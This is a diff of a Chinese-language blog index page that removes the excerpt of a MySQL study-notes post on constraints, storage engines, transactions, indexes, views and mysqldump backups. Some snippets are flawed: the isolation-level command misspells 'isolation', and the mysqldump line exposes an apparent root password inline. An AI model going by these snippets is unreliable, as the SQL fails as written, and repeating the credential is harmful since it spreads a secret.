-<p>limit 第一个参数是起始位置，从0开始记，第二个参数表示长度</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/images/mysql知识点/image-20200424200318318.png" alt="image-20200424200318318" title="">
-                </div>
-                <div class="image-caption">image-20200424200318318</div>
-            </figure>
-
-<p><strong>tip：limit是sql语句中最后执行的环节</strong></p>
-<h2 id="表的复制"><a href="#表的复制" class="headerlink" title="表的复制"></a>表的复制</h2><p>复制一张dept表，叫做dept1</p>
-<h2 id="将查询结果插入表中"><a href="#将查询结果插入表中" class="headerlink" title="将查询结果插入表中"></a>将查询结果插入表中</h2><p>将dept表中的数据插入到dept1中</p>
-<h2 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h2><p>修改dept1编号为10的部门名为renshibu，地点为上海</p>
-<h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><p>删除10部门数据</p>
-<p><strong>删除大表数据。表被截断，不可回滚，一去不复返</strong></p>
-<h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><h3 id="非空约束：创建一个员工表，姓名不得为空"><a href="#非空约束：创建一个员工表，姓名不得为空" class="headerlink" title="非空约束：创建一个员工表，姓名不得为空"></a>非空约束：创建一个员工表，姓名不得为空</h3><hr>
-<h3 id="唯一性约束："><a href="#唯一性约束：" class="headerlink" title="唯一性约束："></a>唯一性约束：</h3><hr>
-<h4 id="列级约束"><a href="#列级约束" class="headerlink" title="列级约束"></a>列级约束</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> t_user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_user(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>,</span><br><span class="line">username <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unique</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"zhangsan"</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">"zhangsan"</span>);//错误 用户名重复</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">id</span>) <span class="keyword">values</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">id</span>) <span class="keyword">values</span>(<span class="number">3</span>);//正确执行，同为null不认为是重复</span><br></pre></td></tr></tbody></table></figure>
-
-<h4 id="表级约束"><a href="#表级约束" class="headerlink" title="表级约束"></a>表级约束</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> t_user;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_user(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>,</span><br><span class="line">username <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">unique</span>(<span class="keyword">id</span>,username)<span class="comment">--表示联合约束“id”与“username”拼接不能相同</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"zhangsan"</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">"zhangsan"</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">"zhangsan"</span>); <span class="comment">--错误 重复</span></span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="主键约束"><a href="#主键约束" class="headerlink" title="主键约束"></a>主键约束</h3><hr>
-<p><strong>主键字段不得为空也不得重复</strong></p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> t_user;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_user(</span><br><span class="line"><span class="keyword">no</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'zhangsan'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">'lisi'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">'wangwu'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'wangwu'</span>);<span class="comment">--错误，主键重复</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user (<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'wangwu'</span>);<span class="comment">--错误，主键不能为空</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>主键字段自增</strong>auto_increment</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> t_user;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_user(</span><br><span class="line"><span class="keyword">no</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'wangwu'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'lisi'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'zhangsan'</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t_user;</span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h3><hr>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> t_student;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> t_class;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_class(</span><br><span class="line">cno <span class="built_in">int</span>,</span><br><span class="line">classname <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">primary <span class="keyword">key</span>(cno)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_student(</span><br><span class="line">sno <span class="built_in">int</span>,</span><br><span class="line">sname <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">classno <span class="built_in">int</span>,</span><br><span class="line">primary <span class="keyword">key</span>(sno),</span><br><span class="line"><span class="keyword">foreign</span> <span class="keyword">key</span>(classno) <span class="keyword">references</span> t_class(cno)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_class <span class="keyword">values</span>(<span class="number">101</span>,<span class="string">'xxxxxxxxxxxx'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_class <span class="keyword">values</span>(<span class="number">102</span>,<span class="string">'yyyyyyyyyyyy'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_student <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'zs1'</span>,<span class="number">101</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_student <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">'zs2'</span>,<span class="number">101</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_student <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">'zs3'</span>,<span class="number">102</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_student <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">'zs4'</span>,<span class="number">102</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_student <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">'zs5'</span>,<span class="number">102</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_student <span class="keyword">values</span>(<span class="number">6</span>,<span class="string">'zs6'</span>,<span class="number">103</span>);<span class="comment">--执行失败，外键约束</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t_class;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t_student;</span><br></pre></td></tr></tbody></table></figure>
-
-<h2 id="Mysql中的存储引擎"><a href="#Mysql中的存储引擎" class="headerlink" title="Mysql中的存储引擎"></a>Mysql中的存储引擎</h2><p><strong>查看当前mysql支持的存储引擎</strong> </p>
-<p><code>show engines \G</code></p>
-<h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><hr>
-<p><strong>采用三个文件组织一张表</strong></p>
-<p>1.xxx.FRM 存储表结构（格式）</p>
-<p>2.xxx.MYD 存储表中数据</p>
-<p>3.xxx.MYI 存储表中的索引</p>
-<p><strong>优点：可被压缩，节省存储空间。可以转化为只读表，提高检索效率</strong></p>
-<p><strong>缺点：不支持事务。</strong></p>
-<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><hr>
-<p>xxx.FRM存储表结构</p>
-<p>数据存储在tablespace中，这是一个逻辑概念。无法被压缩，无法转化为只读。</p>
-<p>InnoDB支持级联删除和级联更新。（父信息和子信息联动删除和更改）</p>
-<p><strong>优点：支持事务、行级锁、外键。存储数据安全</strong></p>
-<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><hr>
-<p>查询速度最快，但是表存储在内存中，关机就没。</p>
-<h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p><strong>事务只与DML语句挂钩，即insert,delete,updata语句</strong></p>
-<p><strong>四大特性ACID</strong></p>
-<p>1.Atomicity：原子性：事务是最小的工作单元，不可再分。</p>
-<p>2.Consistency：一致性：事务必须保证多条DML语句同时成功或失败</p>
-<p>3.Isolation：隔离性：事务A与事务B之间具有隔离</p>
-<p>4.Durability：持久性：最终数据必须持久化到硬盘中，事务才算成功结束。</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/images/mysql知识点/image-20200430142457042.png" alt="image-20200430142457042" title="">
-                </div>
-                <div class="image-caption">image-20200430142457042</div>
-            </figure>
-
-<h3 id="Demo对比commit和rollback"><a href="#Demo对比commit和rollback" class="headerlink" title="Demo对比commit和rollback"></a>Demo对比commit和rollback</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> t_user;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_user(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'zhangsan'</span>);</span><br><span class="line"><span class="keyword">start</span> <span class="keyword">transaction</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'lisi'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'wangwu'</span>);</span><br><span class="line"><span class="keyword">rollback</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t_user; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'zhangsan'</span>);</span><br><span class="line"><span class="keyword">start</span> <span class="keyword">transaction</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'lisi'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_user(<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="string">'wangwu'</span>);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t_user;</span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="Demo尝试四种隔离级别-此处不给例子"><a href="#Demo尝试四种隔离级别-此处不给例子" class="headerlink" title="Demo尝试四种隔离级别(此处不给例子)"></a>Demo尝试四种隔离级别(此处不给例子)</h3><p><strong>设置事务隔离级别</strong></p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> <span class="keyword">transaction</span> ioslation <span class="keyword">level</span> <span class="keyword">read</span> committed;</span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>查看事务隔离级别</strong></p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@global.tx_isolation;</span><br></pre></td></tr></tbody></table></figure>
-
-<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><h3 id="添加条件"><a href="#添加条件" class="headerlink" title="添加条件"></a>添加条件</h3><hr>
-<p>1.数据量庞大</p>
-<p>2.该字段很少进行DML操作（一旦进行DML操作，索引需要维护，成本很高）</p>
-<p>3.该字段需要经常被查询</p>
-<p><strong>注意：主键和unique约束的字段自动添加索引</strong></p>
-<p><strong>tip：查看sql语句的执行原理</strong></p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">explain</span> <span class="keyword">select</span> ename,sal <span class="keyword">from</span> emp <span class="keyword">where</span> ename=<span class="string">'smith'</span>;</span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="索引语法"><a href="#索引语法" class="headerlink" title="索引语法"></a>索引语法</h3><hr>
-<p><strong>创建索引</strong></p>
-<p>create index 索引名 on 表名(字段名)</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">index</span> emp_sal_index <span class="keyword">on</span> emp(sal);</span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>删除索引</strong></p>
-<p>drop index 索引名 on 表名</p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">index</span> emp_sal_index <span class="keyword">on</span> emp;</span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><hr>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="/images/mysql知识点/image-20200503114054028.png" alt="image-20200503114054028" title="">
-                </div>
-                <div class="image-caption">image-20200503114054028</div>
-            </figure>
-
-<h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><p><strong>创建视图</strong></p>
-<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> myview <span class="keyword">as</span> <span class="keyword">select</span> empno,ename <span class="keyword">from</span> emp;</span><br></pre></td></tr></tbody></table></figure>
-
-<p><strong>对视图进行crud会影响原表中的数据</strong></p>
-<h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><p><strong>数据库导出</strong>（在dos命令窗口执行 不需要登陆mysql）</p>
-<figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump bjpowernode&gt;D:\ls\数挖 -uroot -p7ag-z6(s;</span><br></pre></td></tr></tbody></table></figure>
-
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
-    
-        <div class="post-more-div">
-            <a href="/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/" class="post-more waves-button">
-                Continue reading...
-            </a>
-        </div>
-    </div>
-    
-</article>
-
-        </li>
-    
     </ul>
 
     
+<nav id="page-nav">
+    <div class="inner">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
+    </div>
+</nav>
+
 
 </div>
 
